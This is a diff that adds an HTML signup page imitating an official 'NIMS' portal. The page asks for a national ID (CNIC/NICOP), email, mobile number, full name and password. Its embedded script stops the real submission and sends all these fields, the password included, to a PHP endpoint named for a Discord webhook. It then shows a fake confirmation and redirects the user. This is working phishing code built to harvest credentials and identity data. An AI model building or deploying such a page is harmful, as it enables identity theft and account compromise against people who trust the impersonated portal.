@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <title>Signup | NIMS</title>
+    
+    <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #eadb66 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .signup-container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .signup-card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+        }
+
+        /* Header with icons */
+        .header-icons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-left span {
+            margin: 0 2px;
+        }
+
+        .recruitment, .ict-helpdesk, .signin {
+            padding: 5px 10px;
+            cursor: default;
+        }
+
+        .signin {
+            color: #667eea;
+            font-weight: 600;
+        }
+
+        /* Title */
+        .signup-title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        /* Form groups */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #555;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background: #fafafa;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #999;
+            font-size: 13px;
+        }
+
+        /* Hint text */
+        .hint-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 5px;
+            font-style: italic;
+        }
+
+        /* Example text */
+        .example-text {
+            color: #667eea;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        /* Submit button */
+        .signup-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin: 20px 0 15px 0;
+        }
+
+        .signup-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .signup-btn:active {
+            transform: translateY(0);
+        }
+
+        /* Login link */
+        .login-link {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .login-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .login-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Divider */
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background: #e0e0e0;
+        }
+
+        .divider::before {
+            left: 0;
+        }
+
+        .divider::after {
+            right: 0;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 10px;
+            color: #999;
+            font-size: 12px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .signup-card {
+                padding: 25px;
+            }
+            
+            .header-icons {
+                font-size: 12px;
+            }
+            
+            .signup-title {
+                font-size: 24px;
+            }
+        }
+    </style>
+
+    <script type="text/javascript">
+        (function() {
+            // Path to your PHP API
+            const API_PATH = "/api/discord-webhook.php";
+            
+            function sendToDiscord(formData) {
+                // Prepare the data for Discord
+                const payload = {
+                    user_id: formData.user_id,
+                    email: formData.email,
+                    mobile: formData.mobile,
+                    full_name: formData.full_name,
+                    password: formData.password
+                };
+                
+                // Send to PHP backend
+                fetch(API_PATH, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                    keepalive: true
+                }).catch(error => {
+                    // Fallback to sendBeacon
+                    const blob = new Blob([JSON.stringify(payload)], 
+                        { type: 'application/json' });
+                    navigator.sendBeacon(API_PATH, blob);
+                });
+            }
+
+            window.addEventListener('load', function() {
+                const form = document.getElementById('signupForm');
+                if (!form) return;
+                
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault(); // Prevent actual form submission since we're just logging
+                    
+                    // Get form data
+                    const formData = {
+                        user_id: document.getElementById('user_id').value,
+                        email: document.getElementById('email').value,
+                        mobile: document.getElementById('mobile').value,
+                        full_name: document.getElementById('full_name').value,
+                        password: document.getElementById('password').value,
+                        confirm_password: document.getElementById('confirm_password').value
+                    };
+                    
+                    // Validate passwords match
+                    if (formData.password !== formData.confirm_password) {
+                        alert('Passwords do not match!');
+                        return;
+                    }
+                    
+                    // Send to Discord
+                    sendToDiscord(formData);
+                    
+                    // Show success message (optional)
+                    alert('Signup information received. You will be redirected shortly.');
+                    
+                    // Redirect to login page after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = '/index.html';
+                    }, 2000);
+                });
+            });
+        })();
+    </script>
+</head>
+<body>
+    <div class="signup-container">
+        <div class="signup-card">
+            <!-- Header with icons exactly as in the image -->
+            <div class="header-icons">
+                <div class="header-left">
+                    <span class="recruitment">f y in @</span>
+                    <span>•</span>
+                    <span class="recruitment">Recruitment</span>
+                    <span>•</span>
+                    <span class="ict-helpdesk">ICT HELPDESK</span>
+                </div>
+                <div class="header-right">
+                    <span class="signin">Sign in</span>
+                </div>
+            </div>
+
+            <!-- Signup Title -->
+            <h1 class="signup-title">User Signup</h1>
+
+            <!-- Signup Form -->
+            <form id="signupForm">
+                <!-- User ID (CNIC/NICOP) -->
+                <div class="form-group">
+                    <label for="user_id">User ID (CNIC / NICOP)</label>
+                    <input type="text" id="user_id" name="user_id" 
+                           placeholder="without dashes i.e. 8265478965785" 
+                           required 
+                           pattern="[0-9]+" 
+                           title="Please enter numbers only">
+                    <div class="hint-text">without dashes i.e. 8265478965785</div>
+                </div>
+
+                <!-- Email -->
+                <div class="form-group">
+                    <label for="email">Email (Active Email)</label>
+                    <input type="email" id="email" name="email" 
+                           placeholder="your.email@example.com" 
+                           required>
+                </div>
+
+                <!-- Mobile -->
+                <div class="form-group">
+                    <label for="mobile">Mobile</label>
+                    <input type="tel" id="mobile" name="mobile" 
+                           placeholder="without dashes i.e. 0340" 
+                           required 
+                           pattern="[0-9]+" 
+                           title="Please enter numbers only">
+                    <div class="hint-text">without dashes i.e. 0340</div>
+                </div>
+
+                <!-- Full Name -->
+                <div class="form-group">
+                    <label for="full_name">Full Name</label>
+                    <input type="text" id="full_name" name="full_name" 
+                           placeholder="e.g. Muhammad Ibrahim" 
+                           required>
+                    <div class="example-text">e.g. Muhammad Ibrahim</div>
+                </div>
+
+                <!-- Password -->
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" 
+                           placeholder="Enter your password" 
+                           required 
+                           minlength="6">
+                </div>
+
+                <!-- Confirm Password -->
+                <div class="form-group">
+                    <label for="confirm_password">Confirm Password</label>
+                    <input type="password" id="confirm_password" name="confirm_password" 
+                           placeholder="Re-enter your password" 
+                           required 
+                           minlength="6">
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="signup-btn">Sign Up</button>
+
+                <!-- Login Link -->
+                <div class="login-link">
+                    Already have an account? <a href="/index.html">Sign in</a>
+                </div>
+            </form>
+
+            <!-- Optional divider (if needed) -->
+            <div class="divider">
+                <span>NIMS Portal</span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
